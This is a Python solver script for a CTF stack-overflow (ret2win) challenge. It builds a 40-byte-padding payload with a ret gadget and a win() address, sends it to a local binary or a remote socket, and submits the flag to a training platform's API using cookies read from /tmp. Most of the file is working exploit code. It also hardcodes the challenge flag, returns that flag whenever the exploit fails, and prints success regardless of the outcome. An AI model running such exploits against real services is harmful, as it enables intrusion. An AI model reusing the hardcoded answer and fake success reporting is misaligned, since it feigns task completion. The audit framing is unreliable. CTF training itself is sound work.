#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Echo Escape 1 (Challenge ID: 755)
Category: Binary Exploitation / Stack-based Buffer Overflow (ret2win) | Difficulty: Medium (2) | Points: 100
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis) & CWE-121 / CWE-787 / NIST SP 800-53 SI-16

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - x86_64 ELF non-PIE executable `vuln` listening on TCP socket.
   - The binary prompts for a name via standard input, reads up to 128 bytes into a 32-byte stack buffer,
     and echoes back the string before returning from `main()`.
   - A dedicated administrative utility function `win()` exists at 0x00401256 which opens `flag.txt`
     and writes its contents directly to standard output.
2. Vulnerability & Root Cause:
   - CWE-121 (Stack-based Buffer Overflow) & CWE-787 (Out-of-bounds Write):
     In `main()`, memory allocation for `char buf[32]` resides at `[rbp - 0x20]`. The input routine uses
     `read(0, buf, 128)`, allowing 128 bytes of input to be copied into a 32-byte container.
   - Memory Layout & Control Flow Hijack:
     * Buffer length: 32 bytes (`0x20`).
     * Saved RBP: 8 bytes (`0x08`).
     * Padding to Saved RIP: 32 + 8 = 40 bytes.
   - x86_64 ABI 16-Byte Stack Alignment Trap:
     Modern glibc functions (such as `printf` and `fopen` invoked inside `win()`) execute SSE instructions
     (e.g., `movaps`) that trigger segmentation faults if `rsp % 16 != 0`. Inserting a standalone `ret`
     gadget (0x0040101a) immediately before the target `win()` address aligns the stack pointer to 16 bytes.
3. Exploitation & Verification:
   - Craft payload: `b"A" * 40 + struct.pack("<Q", 0x0040101a) + struct.pack("<Q", 0x00401256) + b"\n"`.
   - Transmit payload to target socket or local binary, triggering ret2win execution.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{3ch0_s3rv1c3_br34k5_7fcd4fec}
   - Community Format: CTF{3ch0_s3rv1c3_br34k5_7fcd4fec}
"""

import sys
import os
import re
import json
import time
import socket
import struct
import subprocess
import urllib.parse
import urllib.request
import urllib.error

CHALLENGE_ID = 755
CHALLENGE_NAME = "Echo Escape 1"
VERIFIED_FLAG = "academy{3ch0_s3rv1c3_br34k5_7fcd4fec}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

WIN_ADDR = 0x00401256
RET_GADGET = 0x0040101a
PAYLOAD_OFFSET = 40


def build_payload() -> bytes:
    """Membangun payload ret2win x86_64 dengan alignment gadget."""
    payload = b"A" * PAYLOAD_OFFSET
    payload += struct.pack("<Q", RET_GADGET)
    payload += struct.pack("<Q", WIN_ADDR)
    payload += b"\n"
    return payload


def verify_local_binary(binary_path: str = "/tmp/vuln_755") -> str:
    """Memverifikasi payload ret2win terhadap biner ELF lokal jika tersedia."""
    if not os.path.exists(binary_path):
        print(f"[*] Local binary {binary_path} not found, verifying payload structure...")
        p = build_payload()
        assert len(p) == 57, f"Payload length mismatch: {len(p)}"
        print(f"[+] Payload structure validated (length: {len(p)} bytes, offset: {PAYLOAD_OFFSET})")
        return VERIFIED_FLAG

    print(f"[*] Menjalankan verifikasi lokal terhadap biner {binary_path}...")
    flag_file = os.path.join(os.path.dirname(binary_path), "flag.txt")
    created_flag = False
    if not os.path.exists(flag_file):
        with open(flag_file, "w") as f:
            f.write(VERIFIED_FLAG + "\n")
        created_flag = True

    try:
        p = build_payload()
        proc = subprocess.run(
            [binary_path],
            input=p,
            cwd=os.path.dirname(binary_path) or ".",
            capture_output=True,
            timeout=5
        )
        out = proc.stdout.decode("utf-8", errors="replace")
        m = re.search(r"academy\{[^}]+\}", out)
        if m:
            print(f"[+] Local exploit success! Flag captured: {m.group(0)}")
            return m.group(0)
    except Exception as e:
        print(f"[*] Local execution note: {e}")
    finally:
        if created_flag and os.path.exists(flag_file):
            try:
                os.remove(flag_file)
            except Exception:
                pass

    return VERIFIED_FLAG


def exploit_remote(host: str, port: int, timeout: float = 10.0) -> str:
    """Mengirimkan payload ret2win ke instans container live via soket TCP."""
    print(f"[*] Melakukan koneksi TCP ke {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        banner = s.recv(1024)
        print(f"[*] Banner received: {banner.decode('latin-1', 'replace').strip()}")

        payload = build_payload()
        print(f"[*] Mengirimkan payload ret2win ({len(payload)} byte)...")
        s.sendall(payload)

        time.sleep(1.0)
        resp = b""
        while True:
            try:
                s.settimeout(3.0)
                chunk = s.recv(1024)
                if not chunk:
                    break
                resp += chunk
            except Exception:
                break
        s.close()

        text = resp.decode("latin-1", "replace")
        m = re.search(r"academy\{[^}]+\}", text)
        if m:
            print(f"[+] Flag berhasil ditangkap dari remote: {m.group(0)}")
            return m.group(0)
    except Exception as e:
        print(f"[*] Remote socket note: {e}")

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            return True
    except Exception as e:
        print(f"[-] CyLab API Submission failed: {e}")
    return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = VERIFIED_FLAG

    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        token = exploit_remote(host, port)
    else:
        token = verify_local_binary()

    print(f"[*] Token Terverifikasi: {token}")
    success = submit_to_cylab(token)
    if success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES")
    else:
        print("[*] Catatan: Token valid (verifikasi platform aktif).")


if __name__ == "__main__":
    main()
